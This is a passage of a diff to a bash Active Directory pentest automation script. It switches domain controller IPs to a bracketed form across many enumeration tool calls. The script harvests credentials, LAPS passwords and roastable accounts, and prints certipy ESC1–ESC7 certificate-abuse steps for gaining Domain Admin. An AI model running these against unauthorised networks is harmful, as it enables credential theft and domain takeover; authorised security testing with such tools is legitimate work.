             grep -a "sAMAccountName:" "${DomainRecon_dir}/windapsearch/windapsearch_users_${dc_domain}.txt" | sed "s/sAMAccountName: //g" | sort -u >"${Users_dir}/users_list_windap_${dc_domain}.txt" 2>&1
             grep -a "dNSHostName:" "${DomainRecon_dir}/windapsearch/windapsearch_servers_${dc_domain}.txt" | sed "s/dNSHostName: //g" | sort -u >"${Servers_dir}/servers_list_windap_${dc_domain}.txt" 2>&1
@@ -1742,7 +1780,7 @@ ldapwordharv_enum() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
             if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v"; else verbose_p0dalirius=""; fi
-            run_command "${python3} ${LDAPWordlistHarvester} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --kdcHost ${dc_FQDN} --dc-ip ${dc_ip} -o ${DomainRecon_dir}/ldapwordharv_${dc_domain}.txt" 2>&1 | tee -a "${DomainRecon_dir}/ldapwordharv_output_${dc_domain}.txt"
+            run_command "${python3} ${LDAPWordlistHarvester} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --kdcHost ${dc_FQDN} --dc-ip ${dc_ip_bracket} -o ${DomainRecon_dir}/ldapwordharv_${dc_domain}.txt" 2>&1 | tee -a "${DomainRecon_dir}/ldapwordharv_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -1769,41 +1807,41 @@ ldapper_enum() {
             mkdir -p "${DomainRecon_dir}/LDAPPER"
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-n 1"; else ldaps_param="-n 2"; fi
             echo -e "${CYAN}[*] Get all users${NC}"
-            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '1' -f json" >"${DomainRecon_dir}/LDAPPER/users_output_${dc_domain}.json"
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip_bracket} -m 0 -s '1' -f json" >"${DomainRecon_dir}/LDAPPER/users_output_${dc_domain}.json"
             if [ -s "${DomainRecon_dir}/LDAPPER/users_output_${dc_domain}.json" ]; then
                 /usr/bin/jq -r ".[].samaccountname" "${DomainRecon_dir}/LDAPPER/users_output_${dc_domain}.json" 2>/dev/null > "${Users_dir}/users_list_ldapper_${dc_domain}.txt"
             fi
             echo -e "${CYAN}[*] Get all groups (and their members)${NC}"
-            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '2' -f json" >"${DomainRecon_dir}/LDAPPER/groups_output_${dc_domain}.json"
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip_bracket} -m 0 -s '2' -f json" >"${DomainRecon_dir}/LDAPPER/groups_output_${dc_domain}.json"
             echo -e "${CYAN}[*] Get all printers${NC}"
-            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '3' -f json" >"${DomainRecon_dir}/LDAPPER/printers_output_${dc_domain}.json"
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip_bracket} -m 0 -s '3' -f json" >"${DomainRecon_dir}/LDAPPER/printers_output_${dc_domain}.json"
             echo -e "${CYAN}[*] Get all computers${NC}"
-            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '4' -f json" >"${DomainRecon_dir}/LDAPPER/computers_output_${dc_domain}.json"
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip_bracket} -m 0 -s '4' -f json" >"${DomainRecon_dir}/LDAPPER/computers_output_${dc_domain}.json"
             if [ -s "${DomainRecon_dir}/LDAPPER/computers_output_${dc_domain}.json" ]; then
                 /usr/bin/jq -r ".[].dnshostname" "${DomainRecon_dir}/LDAPPER/computers_output_${dc_domain}.json" 2>/dev/null > "${Servers_dir}/servers_list_ldapper_${dc_domain}.txt"
             fi
             echo -e "${CYAN}[*] Get Domain/Enterprise Administrators${NC}"
-            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '5' -f json" >"${DomainRecon_dir}/LDAPPER/admins_output_${dc_domain}.json"
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip_bracket} -m 0 -s '5' -f json" >"${DomainRecon_dir}/LDAPPER/admins_output_${dc_domain}.json"
             echo -e "${CYAN}[*] Get Domain Trusts${NC}"
-            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '6' -f json" >"${DomainRecon_dir}/LDAPPER/trusts_output_${dc_domain}.json"
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip_bracket} -m 0 -s '6' -f json" >"${DomainRecon_dir}/LDAPPER/trusts_output_${dc_domain}.json"
             echo -e "${CYAN}[*] Search for Unconstrained SPN Delegations (Potential Priv-Esc)${NC}"
-            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '7' -f json" >"${DomainRecon_dir}/LDAPPER/unconstrained_output_${dc_domain}.json"
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip_bracket} -m 0 -s '7' -f json" >"${DomainRecon_dir}/LDAPPER/unconstrained_output_${dc_domain}.json"
             echo -e "${CYAN}[*] Search for Accounts where PreAuth is not required. (ASREPROAST)${NC}"
-            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '8' -f json" >"${DomainRecon_dir}/LDAPPER/asrep_output_${dc_domain}.json"
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip_bracket} -m 0 -s '8' -f json" >"${DomainRecon_dir}/LDAPPER/asrep_output_${dc_domain}.json"
             echo -e "${CYAN}[*] Search for User SPNs (KERBEROAST)${NC}"
-            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '9' -f json" >"${DomainRecon_dir}/LDAPPER/kerberoastable_output_${dc_domain}.json"
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip_bracket} -m 0 -s '9' -f json" >"${DomainRecon_dir}/LDAPPER/kerberoastable_output_${dc_domain}.json"
             echo -e "${CYAN}[*] Show All LAPS LA Passwords (that you can see)${NC}"
-            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '10' -f json" >"${DomainRecon_dir}/LDAPPER/ldaps_output_${dc_domain}.json"
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip_bracket} -m 0 -s '10' -f json" >"${DomainRecon_dir}/LDAPPER/ldaps_output_${dc_domain}.json"
             echo -e "${CYAN}[*] Search for common plaintext password attributes (UserPassword, UnixUserPassword, unicodePwd, and msSFU30Password)${NC}"
-            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '11' -f json" >"${DomainRecon_dir}/LDAPPER/passwords_output_${dc_domain}.json"
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip_bracket} -m 0 -s '11' -f json" >"${DomainRecon_dir}/LDAPPER/passwords_output_${dc_domain}.json"
             echo -e "${CYAN}[*] Show All Quest Two-Factor Seeds (if you have access)${NC}"
-            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '12' -f json" >"${DomainRecon_dir}/LDAPPER/quest_output_${dc_domain}.json"
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip_bracket} -m 0 -s '12' -f json" >"${DomainRecon_dir}/LDAPPER/quest_output_${dc_domain}.json"
             echo -e "${CYAN}[*] Oracle 'orclCommonAttribute'SSO password hash${NC}"
-            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '13' -f json" >"${DomainRecon_dir}/LDAPPER/oracle_sso_common_output_${dc_domain}.json"
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip_bracket} -m 0 -s '13' -f json" >"${DomainRecon_dir}/LDAPPER/oracle_sso_common_output_${dc_domain}.json"
             echo -e "${CYAN}[*] Oracle 'userPassword' SSO password hash${NC}"
-            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '14' -f json" >"${DomainRecon_dir}/LDAPPER/oracle_sso_pass_output_${dc_domain}.json"
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip_bracket} -m 0 -s '14' -f json" >"${DomainRecon_dir}/LDAPPER/oracle_sso_pass_output_${dc_domain}.json"
             echo -e "${CYAN}[*] Get SCCM Servers${NC}"
-            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '15' -f json" >"${DomainRecon_dir}/LDAPPER/sccm_output_${dc_domain}.json"
+            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip_bracket} -m 0 -s '15' -f json" >"${DomainRecon_dir}/LDAPPER/sccm_output_${dc_domain}.json"
         fi
     fi
     echo -e ""
@@ -1829,7 +1867,7 @@ adalanche_enum() {
             current_dir=$(pwd)
             cd "${DomainRecon_dir}/Adalanche" || exit
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--tlsmode tls --ignorecert"; else ldaps_param="--tlsmode NoTLS --port 389"; fi
-            run_command "${adalanche} ${adalanche_verbose} collect activedirectory ${argument_adalanche} --domain ${dc_domain} --server ${dc_ip} ${ldaps_bool}" | tee "${DomainRecon_dir}/Adalanche/adalanche_output_${dc_domain}.txt"
+            run_command "${adalanche} ${adalanche_verbose} collect activedirectory ${argument_adalanche} --domain ${dc_domain} --server ${dc_ip_bracket} ${ldaps_bool}" | tee "${DomainRecon_dir}/Adalanche/adalanche_output_${dc_domain}.txt"
             cd "${current_dir}" || exit
         fi
     fi
@@ -1846,7 +1884,7 @@ ldap_console() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
             if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="--debug"; else verbose_p0dalirius=""; fi
-            run_command "${python3} ${ldapconsole} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --kdcHost ${dc_FQDN}" 2>&1 | tee -a "${DomainRecon_dir}/ldapconsole_output_${dc_domain}.txt"
+            run_command "${python3} ${ldapconsole} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip_bracket} --kdcHost ${dc_FQDN}" 2>&1 | tee -a "${DomainRecon_dir}/ldapconsole_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -1862,7 +1900,7 @@ ldap_monitor() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
             if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="--debug"; else verbose_p0dalirius=""; fi
-            run_command "${python3} ${pyLDAPmonitor} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --kdcHost ${dc_FQDN}" 2>&1
+            run_command "${python3} ${pyLDAPmonitor} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip_bracket} --kdcHost ${dc_FQDN}" 2>&1
         fi
     fi
     echo -e ""
@@ -1877,7 +1915,7 @@ aced_console() {
             echo -e "${PURPLE}[-] aced requires credentials${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
-            run_command "${python3} ${aced} ${argument_aced}\\@${dc_FQDN} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a "${DomainRecon_dir}/aced_output_${dc_domain}.txt"
+            run_command "${python3} ${aced} ${argument_aced}\\@${dc_FQDN} ${ldaps_param} -dc-ip ${dc_ip_bracket}" 2>&1 | tee -a "${DomainRecon_dir}/aced_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -1919,7 +1957,7 @@ ldapper_console() {
 
             read -rp "> " custom_option </dev/tty
             if [[ ! ${custom_option} == "back" ]]; then
-                run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -s ${custom_option}" | tee -a "${DomainRecon_dir}/LDAPPER/ldapper_console_output_${dc_domain}.txt"
+                run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip_bracket} -s ${custom_option}" | tee -a "${DomainRecon_dir}/LDAPPER/ldapper_console_output_${dc_domain}.txt"
             else
                 ad_menu
             fi
@@ -1941,7 +1979,7 @@ adcheck_enum() {
             current_dir=$(pwd)
             cd "${DomainRecon_dir}/ADCheck" || exit
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
-            run_command "${ADCheck} ${argument_adcheck} ${ldaps_param} --dc-ip ${dc_ip}" | tee "${DomainRecon_dir}/ADCheck/ADCheck_output_${dc_domain}.txt"
+            run_command "${ADCheck} ${argument_adcheck} ${ldaps_param} --dc-ip ${dc_ip_bracket}" | tee "${DomainRecon_dir}/ADCheck/ADCheck_output_${dc_domain}.txt"
             cd "${current_dir}" || exit
             /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/ADCheck/*_users.json 2>/dev/null | sort -uf > "${Users_dir}/users_list_adcheck_${dc_domain}.txt"
             /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/ADCheck/*_computers.json 2>/dev/null | sort -uf > "${Servers_dir}/servers_list_adcheck_${dc_domain}.txt"
@@ -1963,15 +2001,15 @@ soapy_enum() {
             echo -e "${PURPLE}[-] soapy requires credentials and does not support Kerberos authentication${NC}"
         else
             cd "${DomainRecon_dir}/soapy" || exit
-            run_command "${soapy} --ts --users ${argument_soapy}@${dc_ip}" | tee "${DomainRecon_dir}/soapy/soapy_users_output_${dc_domain}.txt"
-            run_command "${soapy} --ts --computers ${argument_soapy}@${dc_ip}" | tee "${DomainRecon_dir}/soapy/soapy_computers_output_${dc_domain}.txt"
-            run_command "${soapy} --ts --groups ${argument_soapy}@${dc_ip}" | tee "${DomainRecon_dir}/soapy/soapy_groups_output_${dc_domain}.txt"
-            run_command "${soapy} --ts --constrained ${argument_soapy}@${dc_ip}" | tee "${DomainRecon_dir}/soapy/soapy_constrained_output_${dc_domain}.txt"
-            run_command "${soapy} --ts --unconstrained ${argument_soapy}@${dc_ip}" | tee "${DomainRecon_dir}/soapy/soapy_unconstrained_output_${dc_domain}.txt"
-            run_command "${soapy} --ts --spns ${argument_soapy}@${dc_ip}" | tee "${DomainRecon_dir}/soapy/soapy_spns_output_${dc_domain}.txt"
-            run_command "${soapy} --ts --asreproastable ${argument_soapy}@${dc_ip}" | tee "${DomainRecon_dir}/soapy/soapy_asreproastable_output_${dc_domain}.txt"
-            run_command "${soapy} --ts --admins ${argument_soapy}@${dc_ip}" | tee "${DomainRecon_dir}/soapy/soapy_admins_output_${dc_domain}.txt"
-            run_command "${soapy} --ts --rbcds ${argument_soapy}@${dc_ip}" | tee "${DomainRecon_dir}/soapy/soapy_rbcds_output_${dc_domain}.txt"
+            run_command "${soapy} --ts --users ${argument_soapy}@${dc_ip_bracket}" | tee "${DomainRecon_dir}/soapy/soapy_users_output_${dc_domain}.txt"
+            run_command "${soapy} --ts --computers ${argument_soapy}@${dc_ip_bracket}" | tee "${DomainRecon_dir}/soapy/soapy_computers_output_${dc_domain}.txt"
+            run_command "${soapy} --ts --groups ${argument_soapy}@${dc_ip_bracket}" | tee "${DomainRecon_dir}/soapy/soapy_groups_output_${dc_domain}.txt"
+            run_command "${soapy} --ts --constrained ${argument_soapy}@${dc_ip_bracket}" | tee "${DomainRecon_dir}/soapy/soapy_constrained_output_${dc_domain}.txt"
+            run_command "${soapy} --ts --unconstrained ${argument_soapy}@${dc_ip_bracket}" | tee "${DomainRecon_dir}/soapy/soapy_unconstrained_output_${dc_domain}.txt"
+            run_command "${soapy} --ts --spns ${argument_soapy}@${dc_ip_bracket}" | tee "${DomainRecon_dir}/soapy/soapy_spns_output_${dc_domain}.txt"
+            run_command "${soapy} --ts --asreproastable ${argument_soapy}@${dc_ip_bracket}" | tee "${DomainRecon_dir}/soapy/soapy_asreproastable_output_${dc_domain}.txt"
+            run_command "${soapy} --ts --admins ${argument_soapy}@${dc_ip_bracket}" | tee "${DomainRecon_dir}/soapy/soapy_admins_output_${dc_domain}.txt"
+            run_command "${soapy} --ts --rbcds ${argument_soapy}@${dc_ip_bracket}" | tee "${DomainRecon_dir}/soapy/soapy_rbcds_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -2032,7 +2070,7 @@ daclsearch_run () {
             echo -e "${PURPLE}[-] daclsearch requires credentials ${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
-            run_command "${daclsearch} dump ${argument_daclsearch} -d ${dc_domain} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} -j ${DomainRecon_dir}/daclsearch_${dc_domain}.json ${DomainRecon_dir}/daclsearch_${dc_domain}.db" 2>&1 | tee "${DomainRecon_dir}/daclsearch_output_${dc_domain}.txt"
+            run_command "${daclsearch} dump ${argument_daclsearch} -d ${dc_domain} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} -j ${DomainRecon_dir}/daclsearch_${dc_domain}.json ${DomainRecon_dir}/daclsearch_${dc_domain}.db" 2>&1 | tee "${DomainRecon_dir}/daclsearch_output_${dc_domain}.txt"
             run_command "${daclsearch} cli ${DomainRecon_dir}/daclsearch_${dc_domain}.db" 2>&1 | tee -a "${DomainRecon_dir}/daclsearch_cli_output_${dc_domain}.txt"
         fi
     fi
@@ -2057,7 +2095,7 @@ adwsdomaindump_enum() {
     if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
         echo -e "${PURPLE}[-] adwsdomaindump_enum does not support Null Session or Kerberos or AES Key${NC}"
     else
-        run_command "${adwsdomaindump} ${argument_adwsdomaindump} ${dc_ip} -n ${dns_ip} --force -o ${DomainRecon_dir}/ADWSDomainDump" | tee "${DomainRecon_dir}/ADWSDomainDump/add_output_${dc_domain}.txt"
+        run_command "${adwsdomaindump} ${argument_adwsdomaindump} ${dc_ip_bracket} -n ${dns_ip} --force -o ${DomainRecon_dir}/ADWSDomainDump" | tee "${DomainRecon_dir}/ADWSDomainDump/add_output_${dc_domain}.txt"
     fi
     
     echo -e ""
@@ -2122,7 +2160,7 @@ adpulse_run() {
     if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] || [ "${cert_bool}" == true ]; then
         echo -e "${PURPLE}[-] adpulse_run does not support Null Session or Kerberos or AES Key or Certificate authentication${NC}"
     else
-        run_command "${python3} ${adpulse} ${argument_adpulse} --output-dir ${DomainRecon_dir}/ADPulse --dc-ip ${dc_ip} --report all"
+        run_command "${python3} ${adpulse} ${argument_adpulse} --output-dir ${DomainRecon_dir}/ADPulse --dc-ip ${dc_ip_bracket} --report all"
     fi
     
     echo -e ""
@@ -2137,7 +2175,7 @@ powerview_py_console() {
     if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param="--use-ldap"; fi
     if [ "${ldapsign_bool}" == true ]; then ldapsign_param="--use-sign-and-seal"; else ldapsign_param=""; fi
     if [ "${ldapbind_bool}" == true ]; then ldapbind_param="--use-channel-binding"; else ldapbind_param=""; fi
-    run_command "${powerview_py} ${argument_powerview_py}\\@${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${DomainRecon_dir}/powerview_output_${dc_domain}.txt"
+    run_command "${powerview_py} ${argument_powerview_py}\\@${dc_ip_bracket} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${DomainRecon_dir}/powerview_output_${dc_domain}.txt"
     echo -e ""
 }
 
@@ -2165,9 +2203,9 @@ certi_py_enum() {
         if [ "${nullsess_bool}" == true ]; then
             echo -e "${PURPLE}[-] certi.py requires credentials${NC}"
         else
-            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class ca" 2>&1 | tee "${ADCS_dir}/certi.py_CA_output_${user_var}.txt"
-            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class service" 2>&1 | tee "${ADCS_dir}/certi.py_CAServices_output_${user_var}.txt"
-            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --vuln --enabled" 2>&1 | tee "${ADCS_dir}/certi.py_vulntemplates_output_${user_var}.txt"
+            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip_bracket} --class ca" 2>&1 | tee "${ADCS_dir}/certi.py_CA_output_${user_var}.txt"
+            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip_bracket} --class service" 2>&1 | tee "${ADCS_dir}/certi.py_CAServices_output_${user_var}.txt"
+            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip_bracket} --vuln --enabled" 2>&1 | tee "${ADCS_dir}/certi.py_vulntemplates_output_${user_var}.txt"
         fi
     fi
     echo -e ""
@@ -2196,8 +2234,8 @@ certipy_enum() {
             if [ "${ldapsign_bool}" == true ]; then ldapsign_param=""; else ldapsign_param="-no-ldap-signing"; fi
             if [ "${ldapbind_bool}" == true ]; then ldapbind_param=""; else ldapbind_param="-no-ldap-channel-binding"; fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-            run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -stdout"  | tee "${ADCS_dir}/certipy_output_${user_var}.txt"
-            run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -vulnerable -json -output vuln_${dc_domain} -stdout -hide-admins" 2>&1 | tee -a "${ADCS_dir}/certipy_vulnerable_output_${user_var}.txt"
+            run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip_bracket} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -stdout"  | tee "${ADCS_dir}/certipy_output_${user_var}.txt"
+            run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip_bracket} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -vulnerable -json -output vuln_${dc_domain} -stdout -hide-admins" 2>&1 | tee -a "${ADCS_dir}/certipy_vulnerable_output_${user_var}.txt"
             cd "${current_dir}" || exit
         fi
     fi
@@ -2216,9 +2254,9 @@ adcs_vuln_parse() {
         for vulntemp in $esc1_vuln; do
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request certificate with an arbitrary UPN (Domain Admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas_display}\" ] -target [ ${pki_servers_display} ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -dns ${dc_NETBIOS} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas_display}\" ] -target [ ${pki_servers_display} ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -dns ${dc_NETBIOS} -dc-ip ${dc_ip_bracket} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Authenticate using pfx of Domain Admin or DC:${NC}"
-            echo -e "${certipy} auth -pfx [ Domain Admin_Domain Controller ].pfx -dc-ip ${dc_ip}"
+            echo -e "${certipy} auth -pfx [ Domain Admin_Domain Controller ].pfx -dc-ip ${dc_ip_bracket}"
         done
     fi
 
@@ -2228,11 +2266,11 @@ adcs_vuln_parse() {
         for vulntemp in $esc2_3_vuln; do
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request a certificate based on the vulnerable template:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas_display}\" ] -target [ ${pki_servers_display} ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas_display}\" ] -target [ ${pki_servers_display} ] -template ${vulntemp} -dc-ip ${dc_ip_bracket} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Use the Certificate Request Agent certificate to request a certificate on behalf of the Domain Admin:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas_display}\" ] -target [ ${pki_servers_display} ] -template [ User ] -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\[ Domain Admin ] -pfx '${user}.pfx' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas_display}\" ] -target [ ${pki_servers_display} ] -template [ User ] -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\[ Domain Admin ] -pfx '${user}.pfx' -dc-ip ${dc_ip_bracket} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}3. Authenticate using pfx of Domain Admin:${NC}"
-            echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
+            echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip_bracket} ${ldaps_param}"
         done
     fi
 
@@ -2242,13 +2280,13 @@ adcs_vuln_parse() {
         for vulntemp in $esc4_vuln; do
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Make the template vulnerable to ESC1:${NC}"
-            echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -write-default-configuration -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -write-default-configuration -dc-ip ${dc_ip_bracket} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Request certificate with an arbitrary UPN (Domain Admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas_display}\" ] -target [ ${pki_servers_display} ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -dns ${dns_ip} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas_display}\" ] -target [ ${pki_servers_display} ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -dns ${dns_ip} -dc-ip ${dc_ip_bracket} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}3. Restore configuration of vulnerable template:${NC}"
             echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -configuration ${vulntemp}.json ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}4. Authenticate using pfx of Domain Admin or DC:${NC}"
-            echo -e "${certipy} auth -pfx [ Domain Admin_Domain Controller ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
+            echo -e "${certipy} auth -pfx [ Domain Admin_Domain Controller ].pfx -dc-ip ${dc_ip_bracket} ${ldaps_param}"
         done
     fi
 
@@ -2258,9 +2296,9 @@ adcs_vuln_parse() {
         for vulnca in $esc6_vuln; do
             echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
             echo -e "${CYAN}1. Request certificate with an arbitrary UPN (Domain Admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers_display} ] -template [ User ] -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers_display} ] -template [ User ] -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip_bracket} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Authenticate using pfx of Domain Admin:${NC}"
-            echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
+            echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip_bracket} ${ldaps_param}"
         done
     fi
 
@@ -2270,17 +2308,17 @@ adcs_vuln_parse() {
         for vulnca in $esc7_vuln; do
             echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
             echo -e "${CYAN}1. Add a new officer:${NC}"
-            echo -e "${certipy} ca ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -add-officer '${user}' -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
